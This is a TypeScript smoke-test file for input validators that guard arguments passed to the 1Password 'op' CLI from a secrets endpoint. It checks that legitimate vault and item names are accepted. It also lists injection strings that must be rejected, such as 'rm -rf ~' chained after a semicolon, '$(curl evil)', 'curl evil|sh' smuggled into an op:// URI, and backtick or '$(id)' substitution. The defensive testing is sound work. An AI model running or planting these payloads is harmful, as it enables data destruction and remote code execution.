/**
 * secret-op-arg-smoketest — offline guard for the 1Password (`op` CLI)
 * argument validators used by the bridge /secrets endpoint.
 *
 * Run: npm run smoke:secret-op-arg
 */

import { isSafeOpArg, assertSafeOpArgs } from '../src/lib/opSecretArg';

let failures = 0;
function fail(m: string): void { failures += 1; console.error('FAIL:', m); }
function pass(m: string): void { console.log('pass:', m); }
function assert(cond: unknown, name: string, detail?: string): void {
  if (cond) pass(name); else fail(`${name}${detail ? ` — ${detail}` : ''}`);
}

// ── Injection vectors must be rejected (identifier kind) ──────────────────
assert(!isSafeOpArg('foo; rm -rf ~'), 'identifier: semicolon command chain rejected');
assert(!isSafeOpArg('--config=/tmp/x'), 'identifier: leading-dash flag injection rejected');
assert(!isSafeOpArg('$(curl evil)'), 'identifier: command substitution rejected');
assert(!isSafeOpArg('`whoami`'), 'identifier: backtick substitution rejected');
assert(!isSafeOpArg('a | b'), 'identifier: pipe rejected');
assert(!isSafeOpArg('a && b'), 'identifier: ampersand rejected');
assert(!isSafeOpArg('quote"inside'), 'identifier: double quote rejected');
assert(!isSafeOpArg('tab\tinside'), 'identifier: tab (control char) rejected');
assert(!isSafeOpArg(''), 'identifier: empty rejected');
assert(!isSafeOpArg(42 as unknown), 'identifier: non-string rejected');
assert(!isSafeOpArg('a'.repeat(513)), 'identifier: over-length rejected');

// ── Legit identifiers accepted ────────────────────────────────────────────
assert(isSafeOpArg('WordPress'), 'identifier: simple item accepted');
assert(isSafeOpArg('username'), 'identifier: field name accepted');
assert(isSafeOpArg('Agent_Credentials'), 'identifier: underscore accepted');
assert(isSafeOpArg('site.example.com'), 'identifier: dotted host accepted');
// 1Password vault/item names commonly contain spaces; execFileSync (argv, no
// shell) makes them safe, so they must be accepted (regression guard).
assert(isSafeOpArg('Agent Credentials'), 'identifier: vault name with space accepted');
assert(isSafeOpArg('WordPress Login'), 'identifier: item name with space accepted');

// ── URI kind ──────────────────────────────────────────────────────────────
assert(isSafeOpArg('op://Agent Credentials/WordPress/password', 'uri'), 'uri: legit op:// with spaces accepted');
assert(!isSafeOpArg('op://x"; curl evil|sh; "', 'uri'), 'uri: quote/pipe injection rejected');
assert(!isSafeOpArg('https://evil.example', 'uri'), 'uri: non op:// prefix rejected');
assert(!isSafeOpArg('-op://x/y/z', 'uri'), 'uri: leading dash rejected');
assert(!isSafeOpArg('op://x/$(id)/z', 'uri'), 'uri: command substitution rejected');

// ── assertSafeOpArgs aggregate ──────────────────────────────────────────────
{
  let threw = false;
  try { assertSafeOpArgs({ item: 'WordPress', vault: 'Agent_Credentials', fields: ['username', 'password'] }); }
  catch { threw = true; }
  assert(!threw, 'assert: clean args pass');
}
{
  let threw = false;
  try { assertSafeOpArgs({ item: 'a; rm -rf ~' }); } catch { threw = true; }
  assert(threw, 'assert: malicious item throws');
}
{
  let threw = false;
  try { assertSafeOpArgs({ uri: 'op://Vault/Item/field' }); } catch { threw = true; }
  assert(!threw, 'assert: clean uri passes');
}
{
  let threw = false;
  try { assertSafeOpArgs({ item: 'WordPress', fields: ['--evil'] }); } catch { threw = true; }
  assert(threw, 'assert: malicious field throws');
}
{
  let threw = false;
  try { assertSafeOpArgs({ item: 'WordPress', fields: 'not-an-array' as unknown }); } catch { threw = true; }
  assert(threw, 'assert: non-array fields throws');
}

if (failures > 0) {
  console.error(`\n${failures} secret-op-arg smoke-test failure(s)`);
  process.exit(1);
}
console.log('\nAll secret-op-arg smoke cases passed.');
